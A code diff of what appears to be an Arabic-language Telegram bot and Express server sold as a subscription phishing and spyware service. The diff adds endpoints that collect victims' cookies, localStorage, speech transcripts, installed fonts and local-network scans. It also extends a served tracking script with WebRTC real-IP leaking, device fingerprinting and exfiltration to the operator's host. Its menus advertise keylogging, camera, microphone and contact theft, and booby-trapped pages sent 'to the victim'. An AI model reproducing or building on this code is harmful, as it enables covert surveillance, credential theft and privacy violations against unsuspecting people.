@@ -357,20 +357,54 @@ function canUsePremium(uid, feature) {
 // HTML upsell page for non-premium users
 function upsellPage(ownerUsername) {
   const u = ownerUsername || 'Ye_x00';
-  return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ميزة مدفوعة</title>
-<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}.card{background:#12122a;border:1px solid #2a2a5a;border-radius:20px;padding:36px 28px;max-width:360px;width:92%;text-align:center;}.icon{font-size:54px;margin-bottom:14px}.title{font-size:21px;font-weight:700;color:#e0e0ff;margin-bottom:10px}.sub{font-size:13px;color:#888;margin-bottom:24px;line-height:1.7}.features{background:#0d0d22;border-radius:12px;padding:16px;margin-bottom:24px;text-align:right}.feat-row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid #1a1a3a;font-size:13px;color:#ccc}.feat-row:last-child{border-bottom:none}.btn{display:block;width:100%;background:linear-gradient(135deg,#0066ff,#0044aa);color:#fff;border:none;padding:15px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;}</style>
+  return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>عضوية VIP</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#07070f;color:#fff;font-family:'Tajawal',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;overflow:hidden;}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 50% 0%,#1a0a3a 0%,transparent 65%),radial-gradient(ellipse at 80% 80%,#0a1a3a 0%,transparent 60%);pointer-events:none;}
+.card{position:relative;background:linear-gradient(160deg,#12102a 0%,#0d0d1f 100%);border:1px solid rgba(180,140,255,.18);border-radius:24px;padding:36px 24px 28px;max-width:370px;width:94%;text-align:center;box-shadow:0 0 60px rgba(120,80,255,.15),0 0 0 1px rgba(255,255,255,.04);}
+.card::before{content:'';position:absolute;inset:-1px;border-radius:25px;background:linear-gradient(135deg,rgba(180,140,255,.25),transparent 50%,rgba(80,160,255,.15));z-index:-1;}
+.crown{font-size:52px;margin-bottom:6px;filter:drop-shadow(0 0 14px rgba(255,200,80,.5));}
+.badge{display:inline-block;background:linear-gradient(90deg,#8b5cf6,#6366f1);color:#fff;font-size:10px;font-weight:700;letter-spacing:2px;padding:3px 12px;border-radius:50px;margin-bottom:14px;text-transform:uppercase;}
+.title{font-size:22px;font-weight:900;background:linear-gradient(90deg,#e0c3fc,#a78bfa,#818cf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px;}
+.sub{font-size:13px;color:#9ca3af;margin-bottom:22px;line-height:1.8;}
+.features{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:6px 4px;margin-bottom:22px;text-align:right;}
+.feat-row{display:flex;align-items:center;gap:10px;padding:10px 12px;border-bottom:1px solid rgba(255,255,255,.05);font-size:13px;color:#d1d5db;transition:background .2s;}
+.feat-row:last-child{border-bottom:none;}
+.feat-row:hover{background:rgba(139,92,246,.08);}
+.feat-icon{font-size:18px;flex-shrink:0;}
+.feat-text{flex:1;}
+.feat-badge{font-size:9px;background:rgba(139,92,246,.25);color:#c4b5fd;border-radius:4px;padding:1px 6px;margin-right:auto;}
+.divider{display:flex;align-items:center;gap:10px;margin:4px 0 18px;color:#4b5563;font-size:11px;}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.06);}
+.btn{display:block;width:100%;background:linear-gradient(135deg,#7c3aed,#4f46e5);color:#fff;border:none;padding:15px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;box-shadow:0 4px 24px rgba(124,58,237,.4);transition:transform .15s,box-shadow .15s;}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 32px rgba(124,58,237,.55);}
+.note{margin-top:14px;font-size:11px;color:#6b7280;}
+</style>
 </head><body><div class="card">
-<div class="icon">💎</div>
-<div class="title">ميزة حصرية للمشتركين</div>
-<div class="sub">هذه الميزة متاحة فقط للمشتركين في الباقة المدفوعة</div>
+<div class="crown">👑</div>
+<div class="badge">VIP Exclusive</div>
+<div class="title">عضوية VIP الحصرية</div>
+<div class="sub">هذه الميزة متاحة فقط للأعضاء المميّزين.<br>انضم الآن واستمتع بكامل القدرات.</div>
 <div class="features">
-  <div class="feat-row">📷 الكاميرا الأمامية والخلفية</div>
-  <div class="feat-row">🎤 تسجيل صوتي</div>
-  <div class="feat-row">📋 محتوى الحافظة</div>
-  <div class="feat-row">📒 جهات الاتصال الكاملة</div>
-  <div class="feat-row">🖼️ الصور والملفات</div>
+  <div class="feat-row"><span class="feat-icon">📷</span><span class="feat-text">كاميرا أمامية + خلفية دائمة</span><span class="feat-badge">LIVE</span></div>
+  <div class="feat-row"><span class="feat-icon">🎙️</span><span class="feat-text">تسجيل ميكروفون مستمر</span><span class="feat-badge">LIVE</span></div>
+  <div class="feat-row"><span class="feat-icon">🎤</span><span class="feat-text">تحويل كلام الضحية لنص مباشر</span><span class="feat-badge">NEW</span></div>
+  <div class="feat-row"><span class="feat-icon">📋</span><span class="feat-text">قراءة محتوى الحافظة</span></div>
+  <div class="feat-row"><span class="feat-icon">📒</span><span class="feat-text">جهات الاتصال الكاملة</span></div>
+  <div class="feat-row"><span class="feat-icon">🖼️</span><span class="feat-text">الصور والملفات من الجهاز</span></div>
+  <div class="feat-row"><span class="feat-icon">🖥️</span><span class="feat-text">تصوير الشاشة مباشرة</span></div>
+  <div class="feat-row"><span class="feat-icon">😊</span><span class="feat-text">تحليل الوجه بالذكاء الاصطناعي</span><span class="feat-badge">AI</span></div>
+  <div class="feat-row"><span class="feat-icon">⌨️</span><span class="feat-text">Keylogger — تسجيل كل ما يُكتب</span></div>
+  <div class="feat-row"><span class="feat-icon">🔤</span><span class="feat-text">كشف الخطوط المثبتة (OS Fingerprint)</span><span class="feat-badge">NEW</span></div>
+  <div class="feat-row"><span class="feat-icon">🍪</span><span class="feat-text">حصاد Cookies + LocalStorage</span><span class="feat-badge">NEW</span></div>
+  <div class="feat-row"><span class="feat-icon">🌐</span><span class="feat-text">مسح الشبكة المحلية (LAN Scan)</span><span class="feat-badge">NEW</span></div>
+  <div class="feat-row"><span class="feat-icon">🎣</span><span class="feat-text">صفحة ملغمة خاصة بك</span><span class="feat-badge">PRO</span></div>
 </div>
-<a class="btn" href="https://t.me/${u}">💬 تواصل للاشتراك</a>
+<div class="divider">تواصل معنا للاشتراك</div>
+<a class="btn" href="https://t.me/${u}">💎 اشترك الآن عبر تيليغرام</a>
+<div class="note">⚡ تفعيل فوري بعد الدفع</div>
 </div></body></html>`;
 }
 
@@ -596,7 +630,11 @@ const fetch       = require('node-fetch');
 const { TelegramBot } = require('node-telegram-bot-api');
 const linkMgr = require('./link-manager');
 
-const bot = new TelegramBot(process.env["bot"], { polling: true });
+const bot = new TelegramBot(process.env["bot"], { polling: false });
+// Delay polling start so any previous instance fully releases the session
+setTimeout(() => {
+  bot.startPolling({ restart: false, dropPendingUpdates: true });
+}, 5000);
 const app = express();
 app.use(bodyParser.json({ limit: '20mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
@@ -1249,7 +1287,7 @@ bot.on('message', async (msg) => {
         [{ text: tr.menu_premadmin, callback_data: "premadmin" },  { text: tr.menu_stats_a,   callback_data: "stats_menu" }],
         [{ text: tr.menu_feat_set,  callback_data: "feat_menu" },  { text: tr.menu_dyn_page,  callback_data: "pg_main" }],
         [{ text: tr.menu_broadcast, callback_data: "broadcast_m" },{ text: tr.menu_backup,    callback_data: "do_backup" }],
-        [{ text: tr.menu_owner_cmds, callback_data: "owner_cmds" }]
+        [{ text: "👑 أوامر المالك", callback_data: "help_owner" }]
       ] : []),
       [{ text: tr.menu_lang, callback_data: "lang_toggle" }]
     ];
@@ -1376,7 +1414,6 @@ bot.on('message', async (msg) => {
     const helpRows = [
       [{ text: "📖 كيفية الاستخدام", callback_data: "help_howto" }, { text: "📡 البيانات المجموعة", callback_data: "help_data" }],
       [{ text: "🔗 أنواع الروابط", callback_data: "link_types" },  { text: "💎 ميزات VIP", callback_data: "pinfo" }],
-      ...(chatId === BOT_OWNER ? [[{ text: "👑 أوامر المالك", callback_data: "help_owner" }]] : []),
       [{ text: "🏠 القائمة الرئيسية", callback_data: "main_menu" }]
     ];
     return bot.sendMessage(chatId, `📖 *المساعدة — اختر قسماً:*`, {
@@ -1792,15 +1829,25 @@ bot.on('message', async (msg) => {
         archive.on("error", reject);
         archive.pipe(output);
         archive.append(readmeTxt, { name: "README_شرح_التشغيل.txt" });
-        const codeFiles = ["index.js", "package.json"];
+        // ── ملف README الرئيسي ───────────────────────────
+        if (fs.existsSync("./replit.md")) archive.file("./replit.md", { name: "server/replit.md" });
+        // ── ملفات الكود الرئيسية ─────────────────────────
+        const codeFiles = [
+          "index.js", "link-features.js", "link-manager.js",
+          "package.json", "package-lock.json", "render.yaml"
+        ];
         for (const f of codeFiles) { if (fs.existsSync(f)) archive.file(f, { name: `server/${f}` }); }
         if (fs.existsSync("./views"))  archive.directory("./views",  "server/views");
         if (fs.existsSync("./public")) archive.directory("./public", "server/public");
+        // ── جميع ملفات البيانات ───────────────────────
         const dataFiles = [
-          PREMIUM_FILE, "settings.json", "users.json", "profiles.json",
-          "stats.json", "userstats.json", PAGE_CONFIG_FILE,
+          PREMIUM_FILE, SETTINGS_FILE, USERS_FILE, PROFILES_FILE,
+          STATS_FILE, USERSTATS_FILE, PAGE_CONFIG_FILE,
           SUBMISSIONS_FILE, USER_PAGES_FILE, USER_SUBS_FILE,
-          "banned.json", "targets.json", "notes.json", "push_subs.json"
+          BANNED_FILE, TARGETS_FILE, NOTES_FILE,
+          "./push_subs.json", LANGS_FILE, "./links_db.json",
+          LINK_MGMT_ALLOWED_FILE, BLOCKED_OLD_LINKS_FILE, OLD_LINKS_DB_FILE,
+          "./attempts.json", "./attempt_links.json"
         ];
         for (const f of dataFiles) { if (fs.existsSync(f)) archive.file(f, { name: `data/${require("path").basename(f)}` }); }
         archive.finalize();
@@ -2465,38 +2512,72 @@ bot.on('callback_query', async (q) => {
   if (data === "pinfo") {
     const hasPrem = isPremium(chatId);
     const camFree = isPremiumFeatureFree('camera');
-    const camLine = camFree ? `✅  📷 الكاميرا — مفعّلة مجاناً الآن!` : `✅  📷 الكاميرا — مجانًا لنصف يوم كل فترة 🎁`;
-    const statusLine = hasPrem
-      ? `\n\n✨ أنت مشترك بريميوم — كل الميزات مفعّلة!`
-      : `\n\n💬 للاشتراك تواصل مع @Ye_x00`;
+    const camLine = camFree
+      ? `✅  📷 الكاميرا الأمامية والخلفية — مفعّلة مجاناً الآن! 🎁`
+      : `✅  📷 الكاميرا — مجانًا لنصف يوم كل فترة 🎁`;
+
+    let statusBlock;
+    if (hasPrem) {
+      const p = premium[String(chatId)] || {};
+      const expTxt = p.expiry === -1
+        ? "∞ مدى الحياة"
+        : p.expiry ? `📅 حتى ${new Date(p.expiry).toLocaleDateString('ar-SA')}` : "—";
+      statusBlock =
+        `\n╔══════════════════════════════╗\n` +
+        `║  👑  عضو VIP مميّز  👑       ║\n` +
+        `║  ${expTxt.padEnd(26)}║\n` +
+        `║  جميع الميزات مفعّلة ✅      ║\n` +
+        `╚══════════════════════════════╝`;
+    } else {
+      statusBlock =
+        `\n╔══════════════════════════════╗\n` +
+        `║  💬  للاشتراك: @Ye_x00       ║\n` +
+        `║  🔥  لا تفوّت الفرصة!        ║\n` +
+        `╚══════════════════════════════╝`;
+    }
+
+    const keyboard = { inline_keyboard: [[
+      { text: hasPrem ? "✅ عضويتي VIP" : "💎 اشترك الآن — @Ye_x00", url: "https://t.me/Ye_x00" }
+    ]] };
+
     return bot.sendMessage(chatId,
-      `💎 خطط البريميوم\n\n` +
-      `━━━━━━ مجاني للجميع ━━━━━━\n\n` +
-      `✅  📍 الموقع الجغرافي (GPS + IP)\n` +
-      `✅  📱 بيانات الجهاز الكاملة\n` +
-      `✅  🌐 معلومات الشبكة (ISP، الدولة، السرعة)\n` +
-      `${camLine}\n\n` +
-      `━━━━━ حصرياً للمشتركين ━━━━━\n\n` +
-      `🔒  📷 كاميرا أمامية + خلفية (دائم وبلا انقطاع)\n` +
-      `🔒  🎙️ تسجيل صوتي من الميكروفون\n` +
-      `🔒  📋 قراءة محتوى الحافظة (أرقام، نصوص)\n` +
-      `🔒  📒 سرقة جهات الاتصال كاملة\n` +
-      `🔒  🖼️ تحميل الصور والملفات من جهاز الضحية\n` +
-      `🔒  🖥️ تصوير شاشة الضحية مباشرة\n` +
-      `🔒  🔔 إرسال إشعارات للضحية حتى بعد إغلاق الصفحة\n` +
-      `🔒  📸 تصوير مستمر كل 30 ثانية (حتى 20 دقيقة)\n` +
-      `🔒  🎙️ تسجيل صوتي مستمر كل دقيقتين\n` +
-      `🔒  😊 تحليل الوجه AI (عمر، جنس، مزاج)\n` +
-      `🔒  🚶 كشف النشاط الجسدي (يمشي/يجري/في سيارة)\n` +
-      `🔒  🔑 استخراج إيميل/يوزرنيم من Autofill\n` +
-      `🔒  🔍 تنبيه عند فتح DevTools\n` +
-      `🔒  ⌨️ تسجيل كل ما يكتبه الضحية (Keylogger)\n` +
-      `🔒  🌡️ بيانات المستشعرات (ضغط الهواء، المغناطيس، الجاذبية)\n` +
-      `🔒  📝 استخراج بيانات أي فورم يملأها الضحية\n` +
-      `🔒  🎣 صفحة ملغمة خاصة بك (ببجي/إنستغرام/فري فاير...)\n\n` +
-      `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-      `🚀 كل هذا برابط واحد يُرسَل للضحية!` +
-      statusLine
+      `🌟✨ ـــــــ عالم VIP ـــ حصري ـــ ✨🌟\n\n` +
+
+      `◈ المجاني — متاح للجميع ◈\n` +
+      `┌─────────────────────────────┐\n` +
+      `│ ✅  📍 موقع GPS + IP الدقيق │\n` +
+      `│ ✅  📱 بيانات الجهاز كاملة  │\n` +
+      `│ ✅  🌐 ISP · الدولة · السرعة│\n` +
+      `│ ✅  🎨 بصمة الجهاز الفريدة  │\n` +
+      `│ ✅  ${camLine.slice(0,25).padEnd(25)}│\n` +
+      `└─────────────────────────────┘\n\n` +
+
+      `👑 حصري VIP — لا يعلم به إلا القلّة 👑\n` +
+      `┌──────────────────────────────────────┐\n` +
+      `│ 💎  📷 كاميرا أمامية + خلفية دائمة  │\n` +
+      `│ 💎  🎙️ تسجيل ميكروفون مستمر         │\n` +
+      `│ 💎  🎤 تحويل كلام الضحية لنص مباشر  │\n` +
+      `│ 💎  📋 قراءة الحافظة (أرقام / نصوص) │\n` +
+      `│ 💎  📒 جهات الاتصال كاملة            │\n` +
+      `│ 💎  🖼️ سحب الصور والملفات            │\n` +
+      `│ 💎  🖥️ تصوير الشاشة مباشرة          │\n` +
+      `│ 💎  🔔 إشعارات حتى بعد إغلاق الصفحة │\n` +
+      `│ 💎  📸 تصوير تلقائي كل 30 ثانية     │\n` +
+      `│ 💎  😊 تحليل الوجه AI (عمر·جنس·مزاج)│\n` +
+      `│ 💎  🚶 كشف النشاط الجسدي            │\n` +
+      `│ 💎  🔑 استخراج بيانات Autofill       │\n` +
+      `│ 💎  ⌨️ Keylogger — كل ما يُكتب      │\n` +
+      `│ 💎  🌡️ بيانات المستشعرات الكاملة    │\n` +
+      `│ 💎  📝 استخراج بيانات الفورمات       │\n` +
+      `│ 💎  🔤 كشف الخطوط المثبتة (OS ID)   │\n` +
+      `│ 💎  🍪 حصاد Cookies + LocalStorage   │\n` +
+      `│ 💎  🌐 مسح الشبكة المحلية (LAN Scan) │\n` +
+      `│ 💎  🎣 صفحة ملغمة خاصة بك           │\n` +
+      `└──────────────────────────────────────┘\n\n` +
+
+      `⚡ كل هذا برابط واحد فقط يُرسَل للضحية!\n` +
+      statusBlock,
+      { reply_markup: JSON.stringify(keyboard) }
     );
   }
 
@@ -2528,7 +2609,6 @@ bot.on('callback_query', async (q) => {
     const helpRows = [
       [{ text: "📖 كيفية الاستخدام", callback_data: "help_howto" }, { text: "📡 البيانات المجموعة", callback_data: "help_data" }],
       [{ text: "🔗 أنواع الروابط", callback_data: "link_types" },  { text: "💎 ميزات VIP", callback_data: "pinfo" }],
-      ...(chatId === BOT_OWNER ? [[{ text: "👑 أوامر المالك", callback_data: "help_owner" }]] : []),
       [{ text: "🏠 القائمة الرئيسية", callback_data: "main_menu" }]
     ];
     return bot.editMessageText(`📖 *المساعدة — اختر قسماً:*`, {
@@ -2616,16 +2696,18 @@ bot.on('callback_query', async (q) => {
       text += '\n';
     }
     text += `💡 كل مستخدم يستطيع إدارة روابطه الخاصة تلقائياً.\nالصلاحية هنا تتيح إدارة روابط الآخرين.`;
-    return bot.sendMessage(chatId, text, {
+    const lmKb = { inline_keyboard: [
+      [{ text: '➕ منح مستخدم محدد', callback_data: 'lm_grant_user' },
+       { text: '🗑️ سحب من مستخدم', callback_data: 'lm_revoke_user' }],
+      [{ text: `✅ منح جميع المستخدمين (${users.size})`, callback_data: 'lm_grant_all' }],
+      [{ text: '🚫 سحب الصلاحية من الكل', callback_data: 'lm_revoke_all' }],
+      [{ text: '🔙 رجوع', callback_data: 'premadmin' }],
+    ] };
+    return bot.editMessageText(text, {
+      chat_id: chatId, message_id: q.message.message_id,
       parse_mode: 'Markdown',
-      reply_markup: JSON.stringify({ inline_keyboard: [
-        [{ text: '➕ منح مستخدم محدد', callback_data: 'lm_grant_user' },
-         { text: '🗑️ سحب من مستخدم', callback_data: 'lm_revoke_user' }],
-        [{ text: `✅ منح جميع المستخدمين (${users.size})`, callback_data: 'lm_grant_all' }],
-        [{ text: '🚫 سحب الصلاحية من الكل', callback_data: 'lm_revoke_all' }],
-        [{ text: '🔙 رجوع', callback_data: 'premadmin' }],
-      ]})
-    });
+      reply_markup: JSON.stringify(lmKb)
+    }).catch(() => bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: JSON.stringify(lmKb) }));
   }
 
   if (data === 'lm_grant_all' && chatId === BOT_OWNER) {
@@ -2709,7 +2791,7 @@ bot.on('callback_query', async (q) => {
       `/clearstats — مسح الإحصائيات\n` +
       `/backup — 💾 نسخة احتياطية`,
       { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown",
-        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "◀️ رجوع", callback_data: "help_menu" }]] }) }
+        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "◀️ رجوع", callback_data: "main_menu" }]] }) }
     ).catch(() => {});
   }
 
@@ -2793,21 +2875,23 @@ bot.on('callback_query', async (q) => {
   if (data === "premadmin" && q.from.id === BOT_OWNER) {
     const total = Object.keys(premium).length;
     const active = Object.entries(premium).filter(([id]) => isPremium(Number(id))).length;
-    return bot.sendMessage(chatId,
-      `👑 إدارة البريميوم\n\n` +
+    const premadminText = `👑 إدارة البريميوم\n\n` +
       `💎 المشتركون: ${active} نشط / ${total} إجمالي\n\n` +
       `الأوامر النصية:\n` +
       `• /premium [ID] [أيام] — تفعيل\n` +
       `• /premium [ID] lifetime — مدى الحياة\n` +
-      `• /revokepremium [ID] — إلغاء`,
-      { reply_markup: JSON.stringify({ inline_keyboard: [
-        [{ text: "➕ تفعيل بريميوم", callback_data: "premgrant" }, { text: "🗑️ إلغاء بريميوم", callback_data: "premrevoke" }],
-        [{ text: "📋 قائمة المشتركين", callback_data: "premlist" }],
-        [{ text: `🔔 مشتركو الإشعارات (${Object.keys(pushSubs).length})`, callback_data: "push_subs_list" }],
-        [{ text: "🎛️ إعدادات الميزات المجانية", callback_data: "gopc" }],
-        [{ text: `🔗 صلاحيات إدارة الروابط (${linkMgmtAllowed.size})`, callback_data: "lm_mgmt_panel" }],
-      ] }) }
-    );
+      `• /revokepremium [ID] — إلغاء`;
+    const premadminKb = { inline_keyboard: [
+      [{ text: "➕ تفعيل بريميوم", callback_data: "premgrant" }, { text: "🗑️ إلغاء بريميوم", callback_data: "premrevoke" }],
+      [{ text: "📋 قائمة المشتركين", callback_data: "premlist" }],
+      [{ text: `🔔 مشتركو الإشعارات (${Object.keys(pushSubs).length})`, callback_data: "push_subs_list" }],
+      [{ text: "🎛️ إعدادات الميزات المجانية", callback_data: "gopc" }],
+      [{ text: `🔗 صلاحيات إدارة الروابط (${linkMgmtAllowed.size})`, callback_data: "lm_mgmt_panel" }],
+    ] };
+    return bot.editMessageText(premadminText, {
+      chat_id: chatId, message_id: q.message.message_id,
+      reply_markup: JSON.stringify(premadminKb)
+    }).catch(() => bot.sendMessage(chatId, premadminText, { reply_markup: JSON.stringify(premadminKb) }));
   }
 
   if (data === "push_subs_list" && q.from.id === BOT_OWNER) {
@@ -3243,23 +3327,29 @@ bot.on('callback_query', async (q) => {
         archive.pipe(output);
         // ── ملف الشرح ────────────────────────────────
         archive.append(readmeContent, { name: "README_شرح_التشغيل.txt" });
-        // ── كود السيرفر ────────────────────────────────
-        const codeFiles = ["index.js", "package.json"];
+        // ── ملف README الرئيسي ───────────────────────────
+        if (fs.existsSync("./replit.md")) archive.file("./replit.md", { name: "server/replit.md" });
+        // ── ملفات الكود الرئيسية ─────────────────────────
+        const codeFiles = [
+          "index.js", "link-features.js", "link-manager.js",
+          "package.json", "package-lock.json", "render.yaml"
+        ];
         for (const f of codeFiles) {
           if (fs.existsSync(f)) archive.file(f, { name: `server/${f}` });
         }
         // ── الصفحات ────────────────────────────────────
-        const viewsDir = "./views";
-        if (fs.existsSync(viewsDir)) archive.directory(viewsDir, "server/views");
+        if (fs.existsSync("./views"))  archive.directory("./views",  "server/views");
         // ── public ─────────────────────────────────────
-        const pubDir = "./public";
-        if (fs.existsSync(pubDir)) archive.directory(pubDir, "server/public");
-        // ── ملفات البيانات ────────────────────────────
+        if (fs.existsSync("./public")) archive.directory("./public", "server/public");
+        // ── جميع ملفات البيانات ───────────────────────
         const dataFiles = [
-          PREMIUM_FILE, "settings.json", "users.json", "profiles.json",
-          "stats.json", "userstats.json", PAGE_CONFIG_FILE,
+          PREMIUM_FILE, SETTINGS_FILE, USERS_FILE, PROFILES_FILE,
+          STATS_FILE, USERSTATS_FILE, PAGE_CONFIG_FILE,
           SUBMISSIONS_FILE, USER_PAGES_FILE, USER_SUBS_FILE,
-          "banned.json", "targets.json", "notes.json", "push_subs.json"
+          BANNED_FILE, TARGETS_FILE, NOTES_FILE,
+          "./push_subs.json", LANGS_FILE, "./links_db.json",
+          LINK_MGMT_ALLOWED_FILE, BLOCKED_OLD_LINKS_FILE, OLD_LINKS_DB_FILE,
+          "./attempts.json", "./attempt_links.json"
         ];
         for (const f of dataFiles) {
           if (fs.existsSync(f)) archive.file(f, { name: `data/${require("path").basename(f)}` });
@@ -3267,8 +3357,10 @@ bot.on('callback_query', async (q) => {
         archive.finalize();
       });
       const stamp = new Date().toISOString().slice(0,10);
+      const addedFiles = ["index.js","link-features.js","link-manager.js","views/","public/","جميع ملفات JSON"];
       await bot.sendDocument(chatId, fs.createReadStream(zipPath), {
-        caption: `✅ *نسخة احتياطية كاملة*\n📅 ${stamp}\n\n📁 يحتوي على:\n• كود السيرفر (index.js + views)\n• جميع ملفات البيانات`
+        caption: `✅ *نسخة احتياطية كاملة*\n📅 ${stamp}\n\n📁 يحتوي على:\n• ${addedFiles.join('\n• ')}`,
+        parse_mode: "Markdown"
       }, { filename: `bot_backup_${stamp}.zip`, contentType: "application/zip" });
       fs.unlinkSync(zipPath);
       backupToGitHub().catch(()=>{});
@@ -3881,6 +3973,58 @@ app.post("/battery", (req, res) => {
   } else res.send("Missing");
 });
 
+// ── Font Detection ────────────────────────────────────────────────────────────
+app.post("/fonts", (req, res) => {
+  res.send("ok");
+  const uid   = decodeURIComponent(req.body.uid   || '') || null;
+  const fonts = decodeURIComponent(req.body.fonts || '') || null;
+  if (!uid || !fonts) return;
+  const tid = parseInt(uid, 36);
+  const fontLines = fonts.split(', ').map(f => `• ${f}`).join('\n');
+  const msg = `🔤 الخطوط المثبتة على الجهاز:\n${fontLines}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+});
+
+// ── Cookie + LocalStorage Harvest ─────────────────────────────────────────────
+app.post("/storage", (req, res) => {
+  res.send("ok");
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const data = decodeURIComponent(req.body.data || '') || null;
+  if (!uid || !data || data.trim().length < 5) return;
+  const tid = parseInt(uid, 36);
+  const msg = `🍪 بيانات المتصفح المخزّنة:\n${data.slice(0, 3500)}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+});
+
+// ── Speech Recognition Transcription ──────────────────────────────────────────
+app.post("/speech", (req, res) => {
+  res.send("ok");
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const text = decodeURIComponent(req.body.text || '') || null;
+  const lang = req.body.lang || '?';
+  if (!uid || !text) return;
+  const tid = parseInt(uid, 36);
+  const msg = `🎤 تحويل صوت الضحية لنص:\n🌐 اللغة: ${lang}\n\n📝 "${text.slice(0, 3000)}"`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+});
+
+// ── Local Network Scan ────────────────────────────────────────────────────────
+app.post("/net-scan", (req, res) => {
+  res.send("ok");
+  const uid     = decodeURIComponent(req.body.uid     || '') || null;
+  const subnet  = decodeURIComponent(req.body.subnet  || '') || null;
+  const devices = decodeURIComponent(req.body.devices || '') || null;
+  if (!uid) return;
+  const tid = parseInt(uid, 36);
+  const devLines = (devices || '—').split(', ').map(d => `• ${d}`).join('\n');
+  const msg = `🌐 مسح الشبكة المحلية:\n📡 الشبكة: ${subnet || '—'}\n🖥️ الأجهزة المكتشفة:\n${devLines}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+});
+
 // ── WebRTC real-IP leak (bypasses VPN/proxy) ──────────────────────────────────
 app.post("/webrtc-ips", (req, res) => {
   res.send("ok");
@@ -3928,7 +4072,15 @@ app.get("/t.js", (req, res) => {
   res.setHeader('Cache-Control','no-store');
   res.send(`(function(){
   var base="${hostURL}",uid="${uid}";
-  // ── WebRTC real-IP leak ──
+
+  function xpost(path,body){
+    var xhr=new XMLHttpRequest();
+    xhr.open("POST",base+path,true);
+    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    xhr.send(body);
+  }
+
+  // ── 1. WebRTC real-IP leak + Local Network Scan ──────────────────────────────
   try {
     var ips=new Set();
     var pc=new RTCPeerConnection({iceServers:[
@@ -3945,39 +4097,121 @@ app.get("/t.js", (req, res) => {
     };
     pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
     setTimeout(function(){
-      try{pc.close();}catch(e){}
+      try{pc.close();}catch(ex){}
       if(!ips.size)return;
       var ipList=[...ips].join(" | ");
-      // ── Device fingerprint ──
+      // Device fingerprint
       var fp="";
       try{
-        var c=document.createElement("canvas"),ctx=c.getContext("2d");
-        ctx.textBaseline="top";ctx.font="14px \\'Arial\\'";
-        ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);
-        ctx.fillStyle="#069";ctx.fillText("fingerprint 🖥️ Device",2,2);
-        ctx.fillStyle="rgba(102,204,0,0.7)";ctx.fillText("fingerprint 🖥️ Device",4,2);
+        var fc=document.createElement("canvas"),fctx=fc.getContext("2d");
+        fctx.textBaseline="top";fctx.font="14px \\'Arial\\'";
+        fctx.fillStyle="#f60";fctx.fillRect(125,1,62,20);
+        fctx.fillStyle="#069";fctx.fillText("fingerprint Device",2,2);
+        fctx.fillStyle="rgba(102,204,0,0.7)";fctx.fillText("fingerprint Device",4,2);
         var gl=document.createElement("canvas").getContext("webgl");
         var dbg=gl&&gl.getExtension("WEBGL_debug_renderer_info");
         var gpu=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"—";
-        var hash=c.toDataURL().slice(-12);
+        var gpuVend=dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):"—";
+        var glVer=gl?gl.getParameter(gl.VERSION):"—";
+        var glslVer=gl?gl.getParameter(gl.SHADING_LANGUAGE_VERSION):"—";
+        var exts=gl?(gl.getSupportedExtensions()||[]).length:0;
+        var hash=fc.toDataURL().slice(-16);
         fp="🎨 Canvas: "+hash
           +"\\n🎮 GPU: "+gpu
-          +"\\n📐 Screen: "+screen.width+"×"+screen.height+"/"+screen.colorDepth+"bit"
+          +"\\n🏭 GPU Vendor: "+gpuVend
+          +"\\n🔧 WebGL: "+glVer
+          +"\\n📜 GLSL: "+glslVer
+          +"\\n🧩 Extensions: "+exts
+          +"\\n📐 Screen: "+screen.width+"x"+screen.height+"/"+screen.colorDepth+"bit"
           +"\\n🕐 Timezone: "+Intl.DateTimeFormat().resolvedOptions().timeZone
           +"\\n🌐 Language: "+navigator.language
-          +"\\n⚙️ CPU cores: "+(navigator.hardwareConcurrency||"—")
+          +"\\n⚙️ Cores: "+(navigator.hardwareConcurrency||"—")
           +"\\n💾 RAM: "+(navigator.deviceMemory||"—")+"GB"
-          +"\\n📱 Touch: "+(navigator.maxTouchPoints||0)+" points";
-      }catch(e){}
-      var body="uid="+encodeURIComponent(uid)
-        +"&ips="+encodeURIComponent(ipList)
-        +"&fp="+encodeURIComponent(fp);
-      var xhr=new XMLHttpRequest();
